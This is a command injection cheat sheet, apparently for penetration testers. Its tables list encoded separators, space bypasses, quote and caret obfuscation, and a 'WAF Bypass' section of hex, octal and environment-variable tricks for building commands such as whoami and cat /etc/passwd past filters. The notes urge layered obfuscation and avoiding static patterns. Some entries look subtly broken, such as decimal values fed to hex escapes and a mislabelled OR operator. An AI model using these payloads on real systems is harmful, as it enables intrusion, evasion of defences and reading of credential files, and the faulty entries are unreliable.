

# Comprehensive Command Injection Reference Guide

## 1. URL Encoding Characters

| Character       | URL Encoded | Hex  | Description              | Example Usage       |
| --------------- | ----------- | ---- | ------------------------ | ------------------- |
| Space           | %20         | 0x20 | Standard space character | cat%20/etc/passwd   |
| Newline         | %0a         | 0x0a | Line feed character      | ls;%0awhoami        |
| Tab             | %09         | 0x09 | Horizontal tab           | cat%09/etc/passwd   |
| Carriage Return | %0d         | 0x0d | Return character         | ls;%0decho hello    |
| Null Byte       | %00         | 0x00 | String terminator        | file.php%00.jpg     |
| Vertical Tab    | %0b         | 0x0b | Vertical tab character   | cat%0b/etc/passwd   |
| Form Feed       | %0c         | 0x0c | Form feed character      | ls%0ctemp           |
| Back Space      | %08         | 0x08 | Backspace character      | ca%08at /etc/passwd |
| Double Quote    | %22         | 0x22 | String delimiter         | w%22h%22oami        |
| Single Quote    | %27         | 0x27 | String delimiter         | w%27h%27oami        |
| Back Tick       | %60         | 0x60 | Command substitution     | %60whoami%60        |

## 2. Command Chain Operators

| Operator | URL Encoded     | Alternative              | Description            | Example      |
| -------- | --------------- | ------------------------ | ---------------------- | ------------ |
| ;        | %3b             | ${LS_COLORS:10:1}        | Sequential execution   | ls;id        |
| \|       | %7c             | $(printf '\|')           | Pipe output            | ls\|grep txt |
| &        | %26             | $(printf '&')            | Background execution   | ls & id      |
| &&       | %26%26          | $(printf '&&')           | AND operator           | ls && id     |
| \|       | %7c%7c          | $(printf '\|')           | OR operator            | ls \| id     |
| `        | %60             | $(command)               | Command substitution   | `whoami`     |
| $()      | %24%28%29       | `command`                | Command substitution   | $(whoami)    |
| \|%5c    | ${HOMEPATH:0:1} | Path separator (Windows) | dir\temp               |              |
| /        | %2f             | ${PATH:0:1}              | Path separator (Linux) | ls/etc       |
| >        | %3e             | $(printf '>')            | Output redirection     | ls>file.txt  |
| <        | %3c             | $(printf '<')            | Input redirection      | cat<file.txt |

## 3. Space Bypass Techniques

|Method|Example|Platform|Description|
|---|---|---|---|
|${IFS}|cat${IFS}/etc/passwd|Linux|Internal Field Separator|
|${\t}|cat${\t}/etc/passwd|Linux|Tab character|
|{cat,/etc/passwd}|{cat,/etc/passwd}|Linux|Brace expansion|
|X=$'cat\x20/etc/passwd'|$X|Linux|ANSI-C quoting|
|%09|cat%09/etc/passwd|Both|URL-encoded tab|
|<tab>|cat<tab>/etc/passwd|Both|Literal tab character|
|{cat,"passwd"}|{cat,"/etc/passwd"}|Linux|Brace expansion with quotes|
|$'\x20'|cat$'\x20'/etc/passwd|Linux|Hex-encoded space|
|$' '|cat$' '/etc/passwd|Linux|Single quoted space|
|\x20|cat\x20/etc/passwd|Linux|Hex space (shell)|

## 4. Linux-Specific Command Obfuscation

|Technique|Example|Description|Alternative|
|---|---|---|---|
|Base64|$(echo "Y2F0IC9ldGMvcGFzc3dk" \| base64 -d)|Base64 encoded command|echo Y2F0IC9ldGMvcGFzc3dk\|base64 -d\|bash|
|Single Quotes|w'h'o'a'm'i|Quote injection|c'a't' '/e't'c/pa's'swd|
|Double Quotes|w"h"o"a"m"i"|Double quote injection|c"a"t" "/e"t"c/pa"s"swd|
|Backslash|w\h\o\a\m\i|Backslash injection|c\a\t\ /e\t\c/\passwd|
|$@ Character|w$@h$@o$@a$@m$@i|Parameter expansion|c$@a$@t$@ /e$@tc/pa$@sswd|
|Variable Expansion|$(w)$(h)$(o)$(a)$(m)$(i)|Variable substitution|${HOME:0:1}${HOME:1:1}${HOME:2:1}|
|Hex Encoding|$'\x77\x68\x6f\x61\x6d\x69'|Hex encoded string|printf "\x77\x68\x6f\x61\x6d\x69"|
|Octal Encoding|$'\167\150\157\141\155\151'|Octal encoded string|printf "\167\150\157\141\155\151"|
|Unicode Encoding|$'\u0077\u0068\u006f\u0061\u006d\u0069'|Unicode encoded string|echo -e "\u0077\u0068\u006f\u0061\u006d\u0069"|

## 5. Windows-Specific Command Obfuscation

|Technique|Example|Description|Alternative|
|---|---|---|---|
|Caret|w^h^o^a^m^i|Caret injection|d^i^r c:^\^windows|
|Environment Variables|%SYSTEMROOT:~0,1%dir|Variable substring|%COMSPEC:~0,1%md|
|Command Extensions|FOR %i IN (whoami) DO %i|FOR loop execution|FOR /F "tokens=*" %i IN ('whoami') DO %i|
|Call Command|CALL whoami|CALL keyword|CALL "who"+"ami"|
|Delayed Expansion|!COMSPEC!|Delayed variable expansion|!SYSTEMROOT!\system32\whoami.exe|
|String Concatenation|set a=who&set b=ami&call %a%%b%|String building|set x=who&& call %x%ami|
|Command Aliases|doskey ls=dir && ls|Command aliasing|doskey w=whoami && w|
|PowerShell Tricks|powershell -enc BASE64|Base64 encoded command|powershell -nop -c "whoami"|
|Batch Variables|%COMSPEC:~0,1%MD|Variable substring|%SystemRoot:~0,1%IR|
|PowerShell Variables|$env:COMSPEC.SubString(0,1)|PowerShell substring|$env:windir[0]|

## 6. Environment Variable Methods

|Variable|Usage|Description|Example|
|---|---|---|---|
|PATH|${PATH:0:1}|Extract slash|ls${PATH:0:1}etc|
|HOME|${HOME:0:1}|First character|${HOME:0:1}bin|
|PWD|${PWD:0:1}|Current directory|${PWD:0:1}tmp|
|USER|${USER:0:1}|Username first char|echo${IFS}${USER}|
|SHELL|${SHELL:0:1}|Shell path first char|${SHELL:0:1}bin|
|HOSTNAME|${HOSTNAME:0:1}|Hostname first char|echo${IFS}${HOSTNAME}|
|LS_COLORS|${LS_COLORS:10:1}|Extract semicolon|ls${LS_COLORS:10:1}id|
|LANG|${LANG:0:1}|Language setting|echo${LANG:0:1}|
|PS1|${PS1:0:1}|Prompt setting|echo${PS1:0:1}|
|TERM|${TERM:0:1}|Terminal type|echo${TERM:0:1}|

## 7. Advanced Techniques

|Category|Method|Example|Description|
|---|---|---|---|
|Time-Based|sleep${IFS}5|Execute with delay|Useful for blind injection|
|Output-Based|whoami>out.txt|Redirect to file|File-based output capture|
|Error-Based|cat${IFS}/nonexistent 2>&1|Error message injection|Leverages error messages|
|DNS-Based|nslookup${IFS}domain.com|DNS query injection|Network-based detection|
|Nested Commands|$($(echo whoami))|Double substitution|Complex command nesting|
|Parameter Expansion|${PWD##*/}|Path manipulation|Directory extraction|
|Arithmetic Expansion|$((5+5))|Math operations|Numeric calculations|
|Glob Patterns|/etc/p[a]sswd|Pattern matching|Filename expansion|
|Process Substitution|<(ls)|Command output as file|Advanced redirection|
|Here Strings|<<<'string'|String input|Input without files|

## Notes and Best Practices

1. Always consider the target environment (Windows vs Linux) when selecting techniques
2. URL encoding may be necessary depending on the injection point
3. Some characters may be filtered requiring alternative approaches
4. Command separators might need to be combined with other techniques
5. Environmental variables can provide alternatives for blocked characters
6. Consider using multiple layers of obfuscation for complex bypass scenarios
7. Test commands locally before attempting injection
8. Be aware of system-specific limitations and restrictions
9. Document successful bypass techniques for future reference
10. Consider the impact of different shell environments


---

## WAF Bypass

# Advanced Command Construction Techniques

## Dynamic Character Generation

### Hexadecimal Manipulation

|Technique|Example|Explanation|
|---|---|---|
|Basic Hex Print|$(printf "\x77\x68\x6f\x61\x6d\x69")|Directly prints hex values for each character|
|Dynamic Hex Calc|$(printf "\x$(printf %x 119)\x$(printf %x 104)\x$(printf %x 111)\x$(printf %x 97)\x$(printf %x 109)\x$(printf %x 105)")|Calculates hex values dynamically|
|Math-Based Hex|$(printf "\x$(expr 119)\x$(expr 104)\x$(expr 111)\x$(expr 97)\x$(expr 109)\x$(expr 105)")|Uses expr for hex calculations|
|Split Hex|$(X=77;Y=68;printf "\x$X\x$Y\x6f\x61\x6d\x69")|Splits hex values across variables|
|Random-Based Hex|$(for i in 119 104 111 97 109 105;do printf "\x$(printf %x $(expr $i))";done)|Generates hex values in a loop|

### Octal Encoding

| Technique      | Example                                                                 | Explanation                     |
| -------------- | ----------------------------------------------------------------------- | ------------------------------- |
| Direct Octal   | $(printf "%b" "\167\150\157\141\155\151")                               | Uses octal values directly      |
| Split Octal    | $(printf "%b" "\167""\150""\157""\141""\155""\151")                     | Splits octal values into parts  |
| Variable Octal | $(a=167;b=150;printf "%b" "\$a\$b\157\141\155\151")                     | Uses variables for octal values |
| Computed Octal | $(printf "%b" $(for i in 167 150 157 141 155 151;do printf "\$i";done)) | Computes octal in loop          |
| Dynamic Octal  | $(printf "%b" "$(printf %o 119)$(printf %o 104)\157\141\155\151")       | Generates octal dynamically     |



### ASCII Value Processing

|Technique|Example|Explanation|
|---|---|---|
|AWK ASCII|$(awk 'BEGIN{printf "%c%c%c%c%c%c",119,104,111,97,109,105}')|Uses AWK for ASCII conversion|
|Perl ASCII|$(perl -e 'print pack("C*",119,104,111,97,109,105)')|Uses Perl pack function|
|Python ASCII|$(python3 -c 'print("".join([chr(x) for x in [119,104,111,97,109,105]]))')|Python character generation|
|BC Calculation|$(for i in 119 104 111 97 109 105;do echo "obase=8;$i"\|bc\|tr -d '\n';done\|xargs printf "%b")|Uses BC for conversion|
|Expr ASCII|$(for x in 119 104 111 97 109 105;do printf "%b" "\$(printf %o $x)";done)|Uses expr for ASCII|

### File Content Manipulation

|Technique|Example|Explanation|
|---|---|---|
|Password Extract|$(grep -o "...." /etc/passwd\|head -1\|sed 's/root/whoa/'\|sed 's/a/ami/')|Manipulates password file content|
|Hostname Mix|$(h=`hostname`;printf "%b" "\167\150"${h:0:1}"\141\155\151")|Combines hostname with octal|
|Process Info|$(ps -ef\|cut -c1-6\|head -1\|sed 's/[0-9]//g'\|sed 's/[A-Z]/who/'\|sed 's/$/ami/')|Uses process information|
|System Log|$(cat /var/log/syslog 2>/dev/null\|head -1\|cut -c1-3\|sed 's/.*/who/';echo ami)|Leverages system logs|
|File Stats|$(stat /etc/passwd\|tr -cd '[w-z]'\|head -c3;echo ami)|Uses file statistics|

### Environment Variable Construction

|Technique|Example|Explanation|
|---|---|---|
|Path Extract|$(p=$PATH;printf "%b" "\167\150"${p:0:1}"\141\155\151")|Uses PATH variable|
|User Info|$(u=$USER;printf "%b" "\167\150"${u:0:1}"\141\155\151")|Uses USER variable|
|Shell Path|$(s=$SHELL;printf "%b" "\167\150"${s:0:1}"\141\155\151")|Uses SHELL variable|
|Term Info|$(t=$TERM;printf "%b" "\167\150"${t:0:1}"\141\155\151")|Uses TERM variable|
|PWD Based|$(d=$PWD;printf "%b" "\167\150"${d:0:1}"\141\155\151")|Uses PWD variable|

### Advanced Combinations

| Technique     | Example                                                                          | Explanation               |
| ------------- | -------------------------------------------------------------------------------- | ------------------------- |
| Multi-Source  | $(h=`hostname`;p=$PATH;printf "%b" "\167\150"${h:0:1}${p:0:1}"\155\151")         | Combines multiple sources |
| Time-Based    | $(date +%N\|cut -c1-2\|xargs -I{} printf "%b" "\167\150\157\141\155\151")        | Uses timestamp            |
| Process-Based | $(ps -ef\|wc -l\|xargs -I{} printf "%b" "\167\150\157\141\155\151")              | Uses process count        |
| Memory-Based  | $(free\|grep Mem\|cut -c1-2\|xargs -I{} printf "%b" "\167\150\157\141\155\151")  | Uses memory info          |
| Random-Based  | $(od -An -N1 -i /dev/urandom\|xargs -I{} printf "%b" "\167\150\157\141\155\151") | Uses random data          |

## Important Notes

### Execution Considerations

1. Each technique ensures case sensitivity for proper execution
2. Character encoding methods avoid complete string detection
3. System resource availability affects reliability
4. Error handling may be necessary
5. Performance impact varies by method

### Construction Strategy

6. Use dynamic character generation
7. Combine multiple data sources
8. Implement error checking
9. Consider system limitations
10. Test thoroughly in target environment

### Best Practices

11. Avoid static string patterns
12. Use system state for variability
13. Implement proper error handling
14. Document successful techniques
15. Monitor system impact